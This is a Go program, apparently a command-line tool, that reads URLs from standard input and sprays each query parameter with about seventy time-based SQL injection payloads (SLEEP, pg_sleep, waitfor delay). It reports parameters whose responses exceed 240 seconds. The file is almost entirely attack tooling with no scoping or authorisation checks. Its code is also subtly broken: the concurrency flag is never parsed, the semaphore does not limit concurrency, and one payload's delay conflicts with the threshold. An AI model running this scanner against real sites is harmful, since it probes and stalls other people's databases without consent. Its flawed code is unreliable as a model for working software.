package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sync"
	"time"
)

var sql_payloads = []string{
	"sleep(240)#",
	"1 or sleep(240)#",
	"\" or sleep(240)#",
	"' or sleep(240)#\"",
	"\" or sleep(240)=",
	"' or sleep(240)='",
	"1) or sleep(240)#",
	"\") or sleep(240)=\"",
	"') or sleep(240)='",
	"1)) or sleep(240)#",
	"\")) or sleep(240)=\"",
	"')) or sleep(240)='",
	";waitfor delay '0:0:240'--",
	");waitfor delay '0:0:240'--",
	"';waitfor delay '0:0:240'--",
	"\";waitfor delay '0:0:240'--",
	"');waitfor delay '0:0:240'--",
	"\");waitfor delay '0:0:240'--",
	"));waitfor delay '0:0:240'--",
	"'));waitfor delay '0:0:240'--",
	"\"));waitfor delay '0:0:240'--",
	"pg_sleep(5)--",
	"1 or pg_sleep(240)--",
	"\" or pg_sleep(240)--",
	"' or pg_sleep(240)--",
	"1) or pg_sleep(240)--",
	"\") or pg_sleep(240)--",
	"') or pg_sleep(240)--",
	"1)) or pg_sleep(240)--",
	"\")) or pg_sleep(240)--",
	"')) or pg_sleep(240)--",
	"AND (SELECT * FROM (SELECT(SLEEP(240)))bAKL) AND 'vRxe'='vRxe",
	"AND (SELECT * FROM (SELECT(SLEEP(240)))YjoC) AND '%'='",
	"AND (SELECT * FROM (SELECT(SLEEP(240)))nQIP)",
	"AND (SELECT * FROM (SELECT(SLEEP(240)))nQIP)--",
	"AND (SELECT * FROM (SELECT(SLEEP(240)))nQIP)#",
	"SLEEP(240)#",
	"SLEEP(240)--",
	"SLEEP(240)=",
	"SLEEP(240)='",
	"or SLEEP(240)",
	"or SLEEP(240)#",
	"or SLEEP(240)--",
	"or SLEEP(240)=",
	"or SLEEP(240)='",
	"waitfor delay '00:00:240'",
	"waitfor delay '00:00:240'--",
	"waitfor delay '00:00:240'#",
	"pg_SLEEP(240)",
	"pg_SLEEP(240)--",
	"pg_SLEEP(240)#",
	"or pg_SLEEP(240)",
	"or pg_SLEEP(240)--",
	"or pg_SLEEP(240)#",
	"'\"",
	"AnD SLEEP(240)",
	"AnD SLEEP(240)--",
	"AnD SLEEP(240)#",
	"&&SLEEP(240)",
	"&&SLEEP(240)--",
	"&&SLEEP(240)#",
	"' AnD SLEEP(240) ANd '1",
	"'&&SLEEP(240)&&'1",
	"ORDER BY SLEEP(240)",
	"ORDER BY SLEEP(240)--",
	"ORDER BY SLEEP(240)#",
	"(SELECT * FROM (SELECT(SLEEP(240)))ecMj)",
	"(SELECT * FROM (SELECT(SLEEP(240)))ecMj)#",
	"(SELECT * FROM (SELECT(SLEEP(240)))ecMj)--",
	"+ SLEEP(240) + '",
	"SLEEP(240)/*' or SLEEP(240) or '\" or SLEEP(240) or \"*/",
}

func CheckContains(url_t string) bool {
	re := regexp.MustCompile(`\?\w+=.+`)
	matched := re.MatchString(url_t)
	if matched {
		return true
	} else {
		return false
	}
}

func ExtractHostToPrint(url_t string) string {
	uri, _ := url.Parse(url_t)
	return uri.Host+uri.Path
}

func TestOneByOneSQLi(url_t string, name string, wg *sync.WaitGroup, sem chan bool) {
	defer wg.Done()
	<-sem
	payloads := url.Values{}
	fmt.Print("\033[u\033[K")
	fmt.Printf("HOST: %s ", ExtractHostToPrint(url_t))
	var new_url string
	for _, sql_payload := range sql_payloads {
		payloads.Set(name, sql_payload)
		encoded_payloads := payloads.Encode()
		if CheckContains(url_t) {
			new_url = fmt.Sprintf("%s&%s", url_t, encoded_payloads)
		} else {
			new_url = fmt.Sprintf("%s?%s", url_t, encoded_payloads)
		}
		start := time.Now()
		_, err := http.Get(new_url)
		if err != nil {
			continue
		} else {
			if time.Since(start).Seconds() > 240 {
				fmt.Printf("\nPossibly vulnerable to SQLi ---> %s=%s\n", name, sql_payload)
			}
		}
	}

}
func main() {
	reader := bufio.NewScanner(os.Stdin)
	var wg sync.WaitGroup
	conc := flag.Int("concurrency", 10, "concurrency level")
	sem := make(chan bool, *conc)
	fmt.Print("\033[s")
	for reader.Scan() {
		url_t := reader.Text()
		parsedUri, _ := url.Parse(url_t)
		query, _ := url.ParseQuery(parsedUri.RawQuery)
		for name := range query {
			wg.Add(1)
			sem <- true
			go TestOneByOneSQLi(url_t, name, &wg, sem)
		}
	}
	for i := 0; i < cap(sem); i++ {
		sem <- true
	}
	wg.Wait()
}
